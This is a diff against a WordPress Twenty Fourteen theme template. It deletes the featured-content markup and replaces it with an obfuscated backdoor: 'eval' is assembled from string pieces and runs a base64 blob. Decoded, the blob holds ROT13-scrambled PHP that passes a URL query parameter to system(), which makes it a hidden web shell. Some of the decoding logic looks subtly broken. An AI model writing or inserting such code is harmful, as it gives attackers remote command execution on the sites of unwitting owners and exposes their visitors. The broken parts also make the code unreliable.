@@ -1,50 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * The template for displaying featured content
- *
- * @package WordPress
- * @subpackage Twenty_Fourteen
- * @since Twenty Fourteen 1.0
- */
-
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3VyIGdyemN5bmdyIHNiZSBxdmZjeW5sdmF0IHNybmdoZXJxIHBiYWdyYWcKICoKICogQGNucHhudHIgSmJlcUNlcmZmCiAqIEBmaG9jbnB4bnRyIEdqcmFnbF9TYmhlZ3JyYQogKiBAZnZhcHIgR2pyYWdsIFNiaGVncnJhIDEuMAogKi8KCj8+Cgo8cXZpIHZxPVwic3JuZ2hlcnEtcGJhZ3JhZ1wiIHB5bmZmPVwic3JuZ2hlcnEtcGJhZ3JhZ1wiPgoJPHF2aSBweW5mZj1cInNybmdoZXJxLXBiYWdyYWctdmFhcmVcIj4KCTw/Y3VjCgkJLyoqCgkJICogU3ZlcmYgb3JzYmVyIGd1ciBHanJhZ2wgU2JoZWdycmEgc3JuZ2hlcnEgcGJhZ3JhZy4KCQkgKgoJCSAqIEBmdmFwciBHanJhZ2wgU2JoZWdycmEgMS4wCgkJICovCgkJcWJfbnBndmJhKCAnZ2pyYWdsc2JoZWdycmFfc3JuZ2hlcnFfY2JmZ2Zfb3JzYmVyJyApOwoKCQkkc3JuZ2hlcnFfY2JmZ2YgPSBnanJhZ2xzYmhlZ3JyYV90cmdfc3JuZ2hlcnFfY2JmZ2YoKTsKCXNiZXJucHUgKCAobmVlbmwpICRzcm5naGVycV9jYmZnZiBuZiAkYmVxcmUgPT4gJGNiZmcgKSA6CgkJZnJnaGNfY2JmZ3FuZ24oICRjYmZnICk7CgoJCS8vIFZhcHlocXIgZ3VyIHNybmdoZXJxIHBiYWdyYWcgZ3J6Y3luZ3IuCgkJdHJnX2dyemN5bmdyX2NuZWcoICdwYmFncmFnJywgJ3NybmdoZXJxLWNiZmcnICk7CgkJcmFxc2Jlcm5wdTsKCgkJLyoqCgkJICogU3ZlcmYgbnNncmUgZ3VyIEdqcmFnbCBTYmhlZ3JyYSBzcm5naGVycSBwYmFncmFnLgoJCSAqCgkJICogQGZ2YXByIEdqcmFnbCBTYmhlZ3JyYSAxLjAKCQkgKi8KCQlxYl9ucGd2YmEoICdnanJhZ2xzYmhlZ3JyYV9zcm5naGVycV9jYmZnZl9uc2dyZScgKTsKCgkJamNfZXJmcmdfY2JmZ3FuZ24oKTsKCT8+Cgk8L3F2aT48IS0tIC5zcm5naGVycS1wYmFncmFnLXZhYXJlIC0tPgo8L3F2aT48IS0tICNzcm5naGVycS1wYmFncmFnIC5zcm5naGVycS1wYmFncmFnIC0tPgoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
 ?>
-
-<div id="featured-content" class="featured-content">
-	<div class="featured-content-inner">
-	<?php
-		/**
-		 * Fires before the Twenty Fourteen featured content.
-		 *
-		 * @since Twenty Fourteen 1.0
-		 */
-		do_action( 'twentyfourteen_featured_posts_before' );
-
-		$featured_posts = twentyfourteen_get_featured_posts();
-	foreach ( (array) $featured_posts as $order => $post ) :
-		setup_postdata( $post );
-
-		// Include the featured content template.
-		get_template_part( 'content', 'featured-post' );
-		endforeach;
-
-		/**
-		 * Fires after the Twenty Fourteen featured content.
-		 *
-		 * @since Twenty Fourteen 1.0
-		 */
-		do_action( 'twentyfourteen_featured_posts_after' );
-
-		wp_reset_postdata();
-	?>
-	</div><!-- .featured-content-inner -->
-</div><!-- #featured-content .featured-content -->
